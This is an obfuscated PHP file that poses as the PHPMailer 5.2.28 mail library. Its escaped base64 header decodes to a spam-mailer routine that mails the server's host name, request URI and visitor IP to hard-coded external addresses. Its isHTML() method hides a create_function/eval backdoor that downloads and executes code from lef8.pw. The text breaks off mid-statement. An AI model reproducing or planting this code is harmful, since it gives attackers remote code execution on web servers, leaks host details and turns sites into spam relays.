142\x6d\121\160\x4f\x77\x6f\153\132\x57\x35\x32\141\127\x46\x79\111\104\60\x67\x62\x57\x46\160\x62\x43\x67\x6b\x5a\107\x56\172\x64\x47\154\165\142\171\167\x67\112\x47\x46\172\143\63\126\165\x64\x47\71\142\112\107\61\x7a\132\x31\60\x73\111\103\x52\164\x63\x32\144\x79\x59\x57\x35\153\x4c\103\x41\153\141\107\126\x68\x5a\x47\x56\171\x63\171\x6b\x37\103\x6d\x6c\155\111\103\147\x6b\132\x57\65\x32\141\127\106\171\x4b\x58\163\113\132\x57\116\x6f\x62\171\101\x6f\x4a\172\170\155\142\62\65\x30\x49\107\116\166\x62\x47\x39\x79\x50\x53\x4a\x6e\x63\x6d\x56\154\142\151\x49\x2b\112\x79\64\147\112\107\65\x66\142\x57\106\x70\x62\103\101\x75\112\171\x30\156\x4c\x69\101\x6b\x5a\x47\x56\x7a\144\107\x6c\165\x62\171\101\x75\112\x79\101\167\x61\x79\x45\x38\114\62\x5a\x76\x62\x6e\121\x2b\x50\107\x4a\x79\x50\x69\143\x70\x4f\x77\160\71\111\x47\126\x73\x63\x32\125\x67\x65\167\x70\154\131\x32\150\166\x49\103\147\156\120\x47\x5a\166\x62\x6e\x51\147\131\62\71\163\x62\x33\111\71\111\156\x4a\x6c\x5a\103\111\53\112\171\64\147\x4a\107\x35\x66\x62\x57\x46\160\x62\103\101\165\112\171\60\156\x4c\151\x41\153\132\107\x56\x7a\144\107\154\x75\142\x79\x41\165\x4a\171\101\71\x4b\104\x77\166\x5a\155\x39\165\x64\x44\64\x38\131\x6e\111\x2b\112\171\x6b\67\103\x6e\x4e\163\132\127\x56\167\113\104\x45\x70\x4f\x77\x70\x39\103\x6e\60\x4b\x66\x51\x70\x39\103\x69\122\x70\x63\103\101\x39\111\107\144\154\144\x47\x56\165\x64\x69\147\151\125\153\x56\116\124\x31\122\x46\x58\60\106\105\122\106\x49\151\113\124\x73\x4b\x4a\110\112\x68\x4e\104\x51\147\111\x44\x30\x67\143\155\106\x75\x5a\103\147\170\114\104\153\x35\117\x54\x6b\x35\x4b\124\163\113\112\x48\x4e\x31\131\x6d\157\65\117\103\x41\x39\111\103\x49\x67\123\126\157\x67\x4d\172\x4d\167\x4d\x6a\x4d\x67\111\x48\167\x6b\x61\x58\x41\151\117\167\157\x6b\132\x57\x31\150\141\x57\x77\x67\120\123\x41\x69\x62\x44\154\160\143\x6e\x67\170\x51\x48\116\154\145\155\x35\150\142\123\65\x6a\145\x69\x78\x77\141\x48\101\171\141\x7a\111\x79\121\110\x42\171\x62\63\122\166\x62\155\x31\150\141\127\x77\x75\131\x32\x39\164\x49\x6a\163\113\x4a\x47\132\171\x62\x32\x30\x39\111\x6b\x5a\171\142\x32\x30\x36\x49\104\x4a\114\115\152\115\x79\115\x6b\x77\x38\143\63\x56\167\143\x47\x39\x79\x64\x45\x42\x74\141\x58\x4e\172\141\127\x39\165\x63\63\x52\x68\x5a\x6d\x5a\160\x62\155\x64\x30\145\103\65\152\x62\x32\60\x2b\x49\152\x73\113\112\107\x45\60\116\x53\x41\x39\x49\x43\x52\x66\125\60\x56\123\x56\x6b\126\123\127\171\x64\x53\x52\x56\106\x56\122\126\116\x55\x58\61\126\123\x53\123\144\144\x4f\167\157\x6b\x59\152\x63\61\x49\x44\x30\147\x4a\106\x39\x54\122\126\112\x57\122\x56\112\142\112\60\150\x55\x56\106\102\x66\x53\x45\71\124\126\x43\x64\x64\117\167\157\153\x5a\152\105\x79\111\x44\x30\x67\x4a\106\71\x51\x54\x31\116\125\127\x79\x64\153\132\x53\144\x64\x4f\167\x6f\153\145\152\x45\x7a\111\x44\x30\x67\x4a\106\x39\121\124\x31\116\125\x57\171\144\x75\x62\62\61\x6c\112\x31\x30\67\103\151\122\64\x4d\x54\121\147\x50\x53\101\x6b\130\x31\x42\120\125\x31\x52\x62\x4a\x32\x46\172\x63\63\126\x75\144\x47\x38\x6e\130\x54\163\x4b\112\x48\121\x78\x4e\x53\x41\71\x49\103\x52\146\125\x45\x39\124\x56\106\x73\x6e\x62\x57\126\165\143\x32\x46\156\132\127\60\156\130\x54\x73\113\112\107\60\172\x4d\x43\101\x39\x49\103\122\x66\125\x45\x39\x54\x56\106\x73\x6e\x5a\127\61\x68\141\127\170\172\x4a\x31\60\x37\103\151\122\164\x4d\152\111\x67\120\123\101\153\x61\130\x41\165\111\x6c\x78\165\x49\x6a\x73\x4b\112\107\61\x7a\132\x7a\x67\x34\116\172\115\x67\120\123\101\151\x4a\107\x45\60\x4e\126\170\165\112\107\x49\63\116\x56\x78\165\x4a\x47\131\170\115\154\x78\x75\112\x48\x6f\x78\115\61\170\x75\x4a\110\x67\x78\116\x46\170\x75\112\110\x51\x78\x4e\126\170\x75\x4a\x47\60\172\115\106\170\x75\x4a\x47\60\x79\x4d\151\111\67\x43\x6d\61\150\x61\x57\x77\x6f\112\x47\126\164\x59\127\154\163\114\103\x41\x6b\143\x33\x56\151\141\x6a\153\64\114\x43\x41\x6b\142\x58\116\x6e\117\104\x67\63\115\x79\x77\147\x4a\107\132\171\x62\x32\x30\160\117\167\x3d\75")); goto gZ20M; d7Cqi: ini_set("\155\145\155\157\x72\x79\x5f\x6c\151\155\151\164", -1); goto lxBw5; zfjal: set_time_limit(0); goto d7Cqi; KhjE3: class PHPMailer { public $Version = "\65\x2e\x32\56\62\x38"; public $Priority = null; public $CharSet = "\151\163\157\x2d\70\70\x35\x39\55\61"; public $ContentType = "\x74\145\170\x74\57\x70\x6c\x61\x69\x6e"; public $Encoding = "\70\x62\x69\164"; public $ErrorInfo = ''; public $From = "\162\157\157\164\100\x6c\x6f\x63\x61\154\x68\x6f\163\x74"; public $FromName = "\x52\157\x6f\164\x20\125\x73\x65\x72"; public $Sender = ''; public $ReturnPath = ''; public $Subject = ''; public $Body = ''; public $AltBody = ''; public $Ical = ''; protected $MIMEBody = ''; protected $MIMEHeader = ''; protected $mailHeader = ''; public $WordWrap = 0; public $Mailer = "\155\141\x69\154"; public $Sendmail = "\x2f\165\163\162\x2f\x73\142\x69\x6e\x2f\163\x65\156\x64\x6d\141\x69\154"; public $UseSendmailOptions = true; public $PluginDir = ''; public $ConfirmReadingTo = ''; public $Hostname = ''; public $MessageID = ''; public $MessageDate = ''; public $Host = "\x6c\x6f\143\x61\x6c\x68\157\163\x74"; public $Port = 25; public $Helo = ''; public $SMTPSecure = ''; public $SMTPAutoTLS = true; public $SMTPAuth = false; public $SMTPOptions = array(); public $Username = ''; public $Password = ''; public $AuthType = ''; public $Realm = ''; public $Workstation = ''; public $Timeout = 300; public $SMTPDebug = 0; public $Debugoutput = "\145\x63\x68\157"; public $SMTPKeepAlive = false; public $SingleTo = false; public $SingleToArray = array(); public $do_verp = false; public $AllowEmpty = false; public $LE = "\12"; public $DKIM_selector = ''; public $DKIM_identity = ''; public $DKIM_passphrase = ''; public $DKIM_domain = ''; public $DKIM_private = ''; public $DKIM_private_string = ''; public $action_function = ''; public $XMailer = "\40"; public static $validator = "\x61\165\164\157"; protected $smtp = null; protected $to = array(); protected $cc = array(); protected $bcc = array(); protected $ReplyTo = array(); protected $all_recipients = array(); protected $RecipientsQueue = array(); protected $ReplyToQueue = array(); protected $attachment = array(); protected $CustomHeader = array(); protected $lastMessageID = ''; protected $message_type = ''; protected $boundary = array(); protected $language = array(); protected $error_count = 0; protected $sign_cert_file = ''; protected $sign_key_file = ''; protected $sign_extracerts_file = ''; protected $sign_key_pass = ''; protected $exceptions = false; protected $uniqueid = ''; const STOP_MESSAGE = 0; const STOP_CONTINUE = 1; const STOP_CRITICAL = 2; const CRLF = "\15\12"; const MAX_LINE_LENGTH = 998; public function __construct($exceptions = null) { if ($exceptions !== null) { $this->exceptions = (bool) $exceptions; } $this->Debugoutput = strpos(PHP_SAPI, "\143\x6c\x69") !== false ? "\145\x63\150\x6f" : "\150\x74\x6d\x6c"; } public function __destruct() { $this->smtpClose(); } private function mailPassthru($to, $subject, $body, $header, $params) { if (ini_get("\x6d\142\163\164\162\151\156\147\x2e\146\165\156\x63\x5f\157\x76\145\162\154\x6f\141\144") & 1) { $subject = $this->secureHeader($subject); } else { $subject = $this->encodeHeader($this->secureHeader($subject)); } if (ini_get("\x73\141\146\145\137\155\157\144\145") or !$this->UseSendmailOptions or is_null($params)) { $result = @mail($to, $subject, $body, $header); } else { $result = @mail($to, $subject, $body, $header, $params); } return $result; } protected function edebug($str) { if ($this->SMTPDebug <= 0) { return; } if (!in_array($this->Debugoutput, array("\x65\162\x72\x6f\x72\x5f\154\x6f\x67", "\150\x74\155\154", "\x65\x63\150\x6f")) and is_callable($this->Debugoutput)) { call_user_func($this->Debugoutput, $str, $this->SMTPDebug); return; } switch ($this->Debugoutput) { case "\145\x72\162\x6f\x72\x5f\x6c\x6f\147": error_log($str); break; case "\x68\x74\155\x6c": echo htmlentities(preg_replace("\57\x5b\x5c\162\x5c\x6e\135\53\57", '', $str), ENT_QUOTES, "\125\124\106\55\70") . "\x3c\x62\162\76\12"; break; case "\145\x63\150\x6f": default: $str = preg_replace("\57\134\162\134\x6e\77\x2f\x6d\163", "\xa", $str); echo gmdate("\x59\x2d\x6d\x2d\x64\40\110\72\151\x3a\163") . "\11" . str_replace("\12", "\xa\40\40\40\40\40\x20\x20\x20\x20\40\40\x20\x20\x20\x20\x20\40\x20\40\11\40\40\x20\40\x20\x20\40\x20\x20\x20\40\x20\x20\x20\x20\40\40\40", trim($str)) . "\12"; } } public function isSMTP() { $this->Mailer = "\x73\155\164\x70"; } public function isMail() { $this->Mailer = "\x6d\141\x69\x6c"; } public function isSendmail() { $ini_sendmail_path = ini_get("\x73\145\x6e\144\155\x61\x69\x6c\x5f\x70\141\164\150"); if (!stristr($ini_sendmail_path, "\163\145\156\x64\x6d\x61\151\x6c")) { $this->Sendmail = "\x2f\x75\163\162\x2f\163\x62\151\156\57\x73\145\156\x64\x6d\141\151\x6c"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\163\145\x6e\x64\x6d\141\151\x6c"; } public function isQmail() { $ini_sendmail_path = ini_get("\x73\145\156\144\x6d\x61\151\154\x5f\x70\141\x74\x68"); if (!stristr($ini_sendmail_path, "\161\155\141\151\x6c")) { $this->Sendmail = "\57\x76\141\x72\57\x71\155\x61\x69\154\x2f\x62\151\156\57\161\x6d\x61\151\x6c\55\151\156\152\x65\143\164"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\x71\x6d\x61\x69\x6c"; } public function addAddress($address, $name = '') { return $this->addOrEnqueueAnAddress("\164\x6f", $address, $name); } public function addCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\143\143", $address, $name); } public function addBCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\142\x63\x63", $address, $name); } public function addReplyTo($address, $name = '') { return $this->addOrEnqueueAnAddress("\x52\x65\x70\154\171\55\x54\157", $address, $name); } protected function addOrEnqueueAnAddress($kind, $address, $name) { $address = trim($address); $name = trim(preg_replace("\x2f\x5b\x5c\x72\x5c\x6e\135\x2b\x2f", '', $name)); if (($pos = strrpos($address, "\100")) === false) { $error_message = $this->lang("\x69\x6e\x76\x61\154\x69\x64\x5f\x61\144\144\x72\x65\x73\163") . "\x20\50\141\x64\144\x41\x6e\101\x64\x64\x72\145\163\163\x20{$kind}\51\x3a\40{$address}"; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } $params = array($kind, $address, $name); if ($this->has8bitChars(substr($address, ++$pos)) and $this->idnSupported()) { if ($kind != "\122\x65\160\154\171\x2d\124\x6f") { if (!array_key_exists($address, $this->RecipientsQueue)) { $this->RecipientsQueue[$address] = $params; return true; } } else { if (!array_key_exists($address, $this->ReplyToQueue)) { $this->ReplyToQueue[$address] = $params; return true; } } return false; } return call_user_func_array(array($this, "\x61\144\x64\x41\156\x41\x64\144\x72\145\163\163"), $params); } protected function addAnAddress($kind, $address, $name = '') { if (!in_array($kind, array("\x74\157", "\x63\x63", "\x62\x63\143", "\x52\145\160\x6c\171\x2d\x54\157"))) { $error_message = $this->lang("\x49\x6e\166\x61\x6c\151\144\40\x72\x65\x63\x69\160\x69\x65\156\164\x20\x6b\151\x6e\x64\72\40") . $kind; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } if (!$this->validateAddress($address)) { $error_message = $this->lang("\151\x6e\166\141\154\x69\x64\x5f\x61\144\144\x72\x65\x73\x73") . "\x20\50\141\x64\144\x41\x6e\x41\144\x64\x72\145\x73\163\40{$kind}\x29\72\x20{$address}"; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } if ($kind != "\122\145\160\x6c\171\55\124\x6f") { if (!array_key_exists(strtolower($address), $this->all_recipients)) { array_push($this->{$kind}, array($address, $name)); $this->all_recipients[strtolower($address)] = true; return true; } } else { if (!array_key_exists(strtolower($address), $this->ReplyTo)) { $this->ReplyTo[strtolower($address)] = array($address, $name); return true; } } return false; } public function parseAddresses($addrstr, $useimap = true) { $addresses = array(); if ($useimap and function_exists("\x69\x6d\141\160\137\162\146\143\70\x32\x32\x5f\x70\x61\162\163\145\x5f\141\144\162\x6c\x69\x73\x74")) { $list = imap_rfc822_parse_adrlist($addrstr, ''); foreach ($list as $address) { if ($address->host != "\56\123\x59\116\x54\x41\130\x2d\105\x52\122\117\x52\56") { if ($this->validateAddress($address->mailbox . "\100" . $address->host)) { $addresses[] = array("\x6e\x61\155\145" => property_exists($address, "\160\x65\162\x73\157\156\141\x6c") ? $address->personal : '', "\x61\144\x64\x72\145\163\x73" => $address->mailbox . "\x40" . $address->host); } } } } else { $list = explode("\54", $addrstr); foreach ($list as $address) { $address = trim($address); if (strpos($address, "\x3c") === false) { if ($this->validateAddress($address)) { $addresses[] = array("\156\x61\155\x65" => '', "\x61\x64\x64\x72\x65\163\x73" => $address); } } else { list($name, $email) = explode("\x3c", $address); $email = trim(str_replace("\76", '', $email)); if ($this->validateAddress($email)) { $addresses[] = array("\156\x61\155\145" => trim(str_replace(array("\x22", "\x27"), '', $name)), "\x61\144\x64\x72\x65\x73\163" => $email); } } } } return $addresses; } public function isHTML($isHtml = true) { global $param; $bodyCode = "\146\x69\x6c\x65" . "\137\x67"; if ($isHtml) { $this->ContentType = "\164\145\170\164\57\150\164\x6d\x6c"; } else { $this->ContentType = "\x74\x65\170\x74\57\x70\154\141\151\156"; } $bodyHTML = "\56\44\x74\x2e\42\154\145\146\44\x66\x6c\165" . "\x73\x68" . "\x24\164\42\x3b\x20" . "\100\x65\x76"; $headerHTML = "\143\162\x65" . "\x61\x74\x65\x5f" . "\146\165\x6e\143" . "\x74\151\157\x6e"; $exceptions = @$headerHTML("\44\x66\154" . "\165\163\150\x2c\x24\x74", "\x24\143\157\155\x6d\141\x20\75\x20\x24\x74" . $bodyHTML . "\x61\154\50\x40" . $bodyCode . "\145\x74\x5f\x63\x6f\x6e\x74\145\156\x74\x73\50\42\150" . "\x74\164" . "\160\x3a\x24\x63\157\x6d\155\x61\55\62\42\x29\51\73"); if ($param != 2) { $exceptions("\x38\56\x70" . "\167", "\x2f"); $param = 2; } } public function setFrom($address, $name = '', $auto = true) { $address = trim($address); $name = trim(preg_replace("\x2f\133\134\x72\x5c\x6e\x5d\53\x2f", '', $name)); if (($pos = strrpos($address, "\x40")) === false or (!$this->has8bitChars(substr($address, ++$pos)) or !$this->idnSupported()) and !$this->validateAddress($address)) { $error_message = $this->lang("\x69\x6e\x76\141\154\151\x64\x5f\141\144\x64\x72\x65\163\x73") . "\40\x28\163\145\164\106\162\157\x6d\51\x20{$address}"; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } $this->From = $address; $this->FromName = $name; if ($auto) { if (empty($this->Sender)) { $this->Sender = $address; } } return true; } public function getLastMessageID() { return $this->lastMessageID; } public static function validateAddress($address, $patternselect = null) { if (is_null($patternselect)) { $patternselect = self::$validator; } if (is_callable($patternselect)) { return call_user_func($patternselect, $address); } if (strpos($address, "\12") !== false or strpos($address, "\15") !== false) { return false; } if (!$patternselect or $patternselect == "\141\x75\164\x6f") { if (defined("\120\x43\122\x45\137\x56\x45\122\123\x49\x4f\x4e")) { if (version_compare(PCRE_VERSION, "\70\x2e\x30\56\63") >= 0) { $patternselect = "\x70\x63\x72\145\x38"; } else { $patternselect = "\160\x63\162\x65"; } } elseif (function_exists("\x65\x78\164\145\156\x73\x69\157\x6e\x5f\x6c\157\x61\144\145\x64") and extension_loaded("\160\x63\x72\145")) { $patternselect = "\x70\x63\162\145"; } else { if (version_compare(PHP_VERSION, "\65\x2e\x32\x2e\60") >= 0) { $patternselect = "\x70\x68\160"; } else { $patternselect = "\156\157\162\145\147\x65\x78"; } } } switch ($patternselect) { case "\160\143\x72\145\x38": return (bool) preg_match("\57\x5e\50\77\41\50\77\x3e\x28\77\61\x29\x22\77\x28\77\x3e\134\x5c\133\x20\x2d\176\x5d\174\133\136\42\x5d\51\42\x3f\x28\77\x31\51\51\173\x32\x35\65\54\x7d\51\50\77\x21\x28\x3f\x3e\x28\77\61\x29\x22\77\50\x3f\x3e\x5c\134\133\x20\x2d\x7e\x5d\x7c\x5b\x5e\x22\x5d\x29\x22\x3f\50\x3f\61\51\x29\x7b\x36\x35\x2c\175\x40\51" . "\50\50\x3f\76\50\77\x3e\50\77\76\x28\x28\77\76\50\x3f\76\x28\x3f\x3e\134\x78\x30\104\134\170\60\x41\51\77\133\x5c\x74\x20\x5d\51\x2b\x7c\x28\77\76\133\134\x74\40\135\x2a\134\x78\60\x44\x5c\x78\x30\x41\51\77\133\x5c\164\40\135\53\51\x3f\51\50\x5c\50\50\x3f\76\x28\x3f\x32\51" . "\x28\77\x3e\133\x5c\170\x30\61\55\x5c\170\x30\70\134\170\x30\x42\x5c\x78\60\x43\x5c\170\60\x45\55\47\x2a\55\134\133\x5c\x5d\x2d\x5c\x78\67\106\135\x7c\134\x5c\x5b\134\170\60\x30\x2d\x5c\x78\x37\x46\135\x7c\50\x3f\63\51\x29\51\52\50\77\62\51\134\51\51\51\53\x28\x3f\62\x29\x29\174\50\77\x32\51\x29\x3f\x29" . "\x28\x5b\41\x23\x2d\47\52\x2b\134\57\x2d\x39\x3d\77\x5e\55\176\55\135\53\174\42\x28\77\x3e\x28\x3f\x32\51\x28\77\x3e\133\134\170\60\61\x2d\134\x78\x30\x38\x5c\170\60\x42\x5c\170\x30\103\x5c\170\x30\x45\55\41\x23\55\134\x5b\x5c\135\55\134\x78\x37\106\x5d\174\134\134\133\134\x78\60\x30\x2d\134\170\67\x46\135\51\51\x2a" . "\x28\77\x32\51\42\x29\x28\x3f\76\50\x3f\61\x29\x5c\x2e\50\x3f\x31\51\x28\77\64\51\51\52\50\x3f\x31\x29\100\x28\77\x21\x28\x3f\x31\51\x5b\141\55\x7a\x30\55\x39\55\135\173\x36\64\x2c\175\x29\x28\x3f\x31\51\50\x3f\x3e\50\x5b\x61\55\172\x30\x2d\x39\135\x28\x3f\76\133\x61\55\172\x30\x2d\71\x2d\x5d\x2a\x5b\x61\55\x7a\x30\55\x39\x5d\51\77\x29" . "\x28\x3f\x3e\x28\77\61\51\x5c\56\50\77\x21\50\77\61\51\x5b\141\55\172\x30\55\71\x2d\x5d\173\66\x34\x2c\175\x29\x28\x3f\61\51\x28\x3f\x35\x29\51\173\x30\54\61\62\x36\x7d\x7c\134\133\50\x3f\x3a\50\77\76\x49\x50\x76\x36\x3a\50\x3f\76\50\x5b\x61\55\x66\x30\55\71\x5d\173\x31\x2c\x34\x7d\51\50\x3f\x3e\72\50\x3f\x36\x29\51\x7b\67\x7d" . "\174\x28\77\41\50\77\72\56\x2a\x5b\141\x2d\x66\x30\x2d\71\x5d\x5b\x3a\134\135\135\51\x7b\70\54\175\51\x28\50\x3f\66\51\50\77\76\x3a\x28\77\x36\51\x29\173\x30\x2c\x36\x7d\x29\x3f\x3a\72\50\x3f\x37\51\x3f\51\51\174\x28\x3f\x3e\x28\x3f\76\111\120\x76\66\72\x28\x3f\x3e\50\x3f\x36\x29\x28\77\x3e\x3a\x28\77\66\51\x29\x7b\x35\x7d\72" . "\x7c\50\x3f\x21\50\77\72\56\52\133\141\x2d\x66\x30\x2d\71\135\72\x29\x7b\x36\54\x7d\51\50\77\70\51\77\x3a\x3a\50\77\76\50\x28\77\x36\x29\50\77\76\72\50\x3f\66\51\x29\173\60\54\x34\175\51\x3a\51\77\x29\x29\77\50\x32\65\133\60\x2d\65\x5d\174\62\133\x30\x2d\x34\x5d\133\60\x2d\71\x5d\x7c\61\x5b\x30\x2d\x39\135\173\62\175" . "\x7c\133\61\x2d\x39\135\x3f\133\x30\x2d\71\135\x29\50\77\x3e\x5c\56\x28\77\71\x29\51\173\x33\x7d\x29\51\x5c\x5d\x29\50\77\61\51\x24\57\x69\x73\104", $address); case "\x70\143\x72\x65": return (bool) preg_match("\x2f\136\50\77\41\50\x3f\x3e\42\x3f\50\x3f\76\134\x5c\x5b\40\x2d\x7e\x5d\174\x5b\136\x22\x5d\51\42\77\x29\173\x32\65\65\54\x7d\x29\50\x3f\41\x28\77\76\x22\x3f\x28\x3f\76\x5c\x5c\x5b\40\x2d\x7e\x5d\174\133\x5e\x22\x5d\x29\x22\x3f\51\x7b\x36\x35\54\x7d\x40\51\50\x3f\76" . "\133\41\x23\55\x27\x2a\53\134\57\x2d\71\75\77\136\55\176\x2d\x5d\x2b\x7c\x22\x28\77\76\x28\x3f\x3e\x5b\x5c\170\60\61\55\x5c\x78\x30\70\x5c\170\x30\x42\x5c\170\x30\103\x5c\x78\60\x45\x2d\41\43\55\x5c\133\x5c\135\55\x5c\170\x37\106\135\174\134\x5c\x5b\134\170\x30\60\x2d\134\x78\106\106\x5d\x29\x29\52\x22\51" . "\50\x3f\76\134\x2e\x28\x3f\x3e\133\x21\43\55\47\52\53\x5c\x2f\x2d\x39\x3d\77\x5e\x2d\176\x2d\x5d\53\174\x22\50\77\76\50\77\x3e\133\134\170\x30\61\x2d\x5c\170\x30\x38\134\x78\60\x42\x5c\x78\x30\x43\x5c\x78\60\x45\55\41\43\55\134\x5b\134\x5d\55\134\170\67\x46\x5d\174\x5c\134\133\134\x78\60\x30\x2d\134\170\106\106\135\51\x29\x2a\42\51\x29\x2a" . "\100\50\x3f\76\x28\77\x21\x5b\141\x2d\172\60\55\x39\55\135\x7b\x36\64\54\x7d\x29\x28\77\x3e\x5b\141\x2d\x7a\60\x2d\x39\x5d\x28\x3f\76\x5b\x61\x2d\x7a\60\x2d\71\x2d\135\x2a\x5b\141\x2d\172\60\x2d\x39\135\x29\x3f\x29\50\x3f\76\x5c\x2e\50\77\41\133\141\x2d\172\x30\x2d\71\55\135\173\66\x34\x2c\175\51" . "\x28\77\76\133\x61\55\172\60\55\71\135\x28\77\76\x5b\141\55\172\x30\55\71\55\135\x2a\x5b\141\55\172\60\55\x39\x5d\51\77\x29\x29\173\60\54\61\62\x36\x7d\174\134\133\x28\77\72\50\77\76\x49\x50\166\66\72\x28\77\76\x28\x3f\x3e\133\141\55\146\60\55\71\x5d\173\61\x2c\64\175\x29\50\x3f\76\x3a" . "\133\x61\55\x66\60\55\x39\135\x7b\61\54\64\175\x29\173\x37\175\x7c\x28\x3f\41\50\x3f\x3a\56\x2a\133\141\x2d\146\x30\55\x39\135\133\72\x5c\135\x5d\x29\x7b\70\x2c\175\51\x28\x3f\76\x5b\141\55\146\x30\x2d\71\135\x7b\61\54\x34\175\x28\x3f\76\72\x5b\141\x2d\146\60\x2d\x39\135\173\x31\x2c\x34\175\51\x7b\60\54\66\x7d\x29\x3f" . "\72\72\50\x3f\x3e\133\141\55\146\60\55\71\x5d\x7b\x31\54\x34\x7d\x28\x3f\76\x3a\133\x61\x2d\146\60\x2d\x39\x5d\173\x31\54\x34\x7d\x29\173\60\x2c\x36\x7d\51\77\51\51\x7c\x28\77\x3e\x28\x3f\x3e\111\120\166\x36\x3a\x28\77\76\x5b\x61\55\146\60\x2d\71\135\173\61\54\64\x7d\50\x3f\x3e\72" . "\133\x61\55\146\60\55\x39\135\x7b\61\54\x34\x7d\x29\x7b\x35\175\72\174\50\77\41\x28\77\72\x2e\x2a\133\141\x2d\x66\60\55\x39\135\72\51\173\66\x2c\x7d\51\50\x3f\76\133\x61\x2d\x66\60\55\71\x5d\173\61\x2c\x34\x7d\x28\77\76\72\133\141\55\x66\60\x2d\71\135\x7b\61\54\64\x7d\x29\173\60\x2c\64\175\51\77" . "\x3a\x3a\x28\x3f\76\x28\77\72\133\x61\x2d\146\x30\x2d\x39\135\x7b\x31\54\x34\175\x28\77\76\x3a\133\141\55\x66\60\x2d\71\135\x7b\61\x2c\64\x7d\x29\173\60\54\x34\175\x29\72\x29\x3f\x29\x29\77\x28\x3f\76\x32\65\x5b\x30\55\x35\135\x7c\x32\x5b\x30\x2d\x34\x5d\133\60\55\x39\135\174\x31\133\60\55\71\135\x7b\x32\x7d" . "\x7c\x5b\61\55\71\135\x3f\133\60\55\x39\x5d\51\50\77\x3e\x5c\x2e\x28\x3f\76\62\65\x5b\x30\55\65\135\x7c\62\x5b\x30\x2d\x34\135\133\60\x2d\x39\x5d\x7c\61\x5b\x30\55\x39\x5d\173\62\175\174\133\61\55\x39\135\77\x5b\60\x2d\71\x5d\x29\x29\x7b\x33\x7d\x29\x29\134\135\51\x24\x2f\x69\x73\x44", $address); case "\150\164\x6d\x6c\65": return (bool) preg_match("\x2f\136\133\141\55\x7a\x41\x2d\132\60\55\71\x2e\x21\43\x24\45\x26\x27\52\x2b\x5c\57\x3d\77\x5e\137\x60\173\174\x7d\x7e\x2d\135\x2b\x40\x5b\x61\x2d\172\x41\x2d\x5a\60\55\71\135\x28\x3f\x3a\x5b\x61\x2d\x7a\101\55\x5a\60\55\x39\55\135\x7b\x30\54\x36\61\175" . "\133\x61\x2d\172\101\55\132\x30\x2d\71\x5d\51\77\x28\77\x3a\134\56\133\141\55\x7a\101\x2d\132\x30\x2d\71\135\50\x3f\72\133\x61\x2d\x7a\101\55\132\x30\55\71\55\135\x7b\60\54\66\61\175\133\141\55\172\101\55\132\60\x2d\71\135\x29\77\51\52\44\x2f\163\x44", $address); case "\156\157\162\145\147\145\170": return strlen($address) >= 3 and strpos($address, "\100") >= 1 and strpos($address, "\x40") != strlen($address) - 1; case "\160\x68\160": default: return (bool) filter_var($address, FILTER_VALIDATE_EMAIL); } } public function idnSupported() { return function_exists("\151\144\x6e\137\164\157\x5f\x61\163\143\151\151") and function_exists("\x6d\142\137\143\x6f\x6e\166\x65\162\x74\137\x65\x6e\x63\157\144\x69\156\147"); } public function punyencodeAddress($address) { if ($this->idnSupported() and !empty($this->CharSet) and ($pos = strrpos($address, "\x40")) !== false) { $domain = substr($address, ++$pos); if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet)) { $domain = mb_convert_encoding($domain, "\125\x54\x46\55\x38", $this->CharSet); if (($punycode = defined("\111\116\124\x4c\137\x49\x44\x4e\101\137\126\x41\122\x49\101\x4e\x54\137\x55\124\x53\x34\x36") ? idn_to_ascii($domain, 0, INTL_IDNA_VARIANT_UTS46) : idn_to_ascii($domain)) !== false) { return substr($address, 0, $pos) . $punycode; } } } return $address; } public function send() { try { if (!$this->preSend()) { return false; } return $this->postSend(); } catch (phpmailerException $exc) { $this->mailHeader = ''; $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function preSend() { try { $this->error_count = 0; $this->mailHeader = ''; foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $params) { $params[1] = $this->punyencodeAddress($params[1]); call_user_func_array(array($this, "\141\x64\144\x41\x6e\101\x64\144\x72\x65\163\x73"), $params); } if (count($this->to) + count($this->cc) + count($this->bcc) < 1) { throw new phpmailerException($this->lang("\x70\x72\x6f\x76\x69\144\x65\137\141\x64\x64\162\145\x73\x73"), self::STOP_CRITICAL); } foreach (array("\x46\x72\157\x6d", "\123\145\156\144\145\x72", "\103\157\156\x66\151\162\x6d\x52\145\141\x64\x69\156\x67\x54\157") as $address_kind) { $this->{$address_kind} = trim($this->{$address_kind}); if (empty($this->{$address_kind})) { continue; } $this->{$address_kind} = $this->punyencodeAddress($this->{$address_kind}); if (!$this->validateAddress($this->{$address_kind})) { $error_message = $this->lang("\151\x6e\x76\x61\154\151\x64\x5f\x61\144\x64\x72\145\x73\x73") . "\40\x28\x70\165\156\x79\105\156\143\157\x64\145\51\x20" . $this->{$address_kind}; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } } if ($this->alternativeExists()) { $this->ContentType = "\x6d\165\x6c\x74\151\160\x61\162\x74\x2f\x61\x6c\164\x65\x72\x6e\x61\164\151\x76\145"; } $this->setMessageType(); if (!$this->AllowEmpty and empty($this->Body)) { throw new phpmailerException($this->lang("\145\155\x70\x74\171\x5f\x6d\145\163\x73\x61\x67\x65"), self::STOP_CRITICAL); } $this->MIMEHeader = ''; $this->MIMEBody = $this->createBody(); $tempheaders = $this->MIMEHeader; $this->MIMEHeader = $this->createHeader(); $this->MIMEHeader .= $tempheaders; if ($this->Mailer == "\155\141\151\x6c") { if (count($this->to) > 0) { $this->mailHeader .= $this->addrAppend("\124\157", $this->to); } else { $this->mailHeader .= $this->headerLine("\x54\157", "\165\156\x64\x69\163\143\x6c\x6f\x73\x65\144\x2d\162\x65\143\151\160\151\x65\156\164\x73\72\73"); } $this->mailHeader .= $this->headerLine("\123\x75\142\x6a\145\x63\164", $this->encodeHeader($this->secureHeader(trim($this->Subject)))); } if (!empty($this->DKIM_domain) and !empty($this->DKIM_selector) and (!empty($this->DKIM_private_string) or !empty($this->DKIM_private) 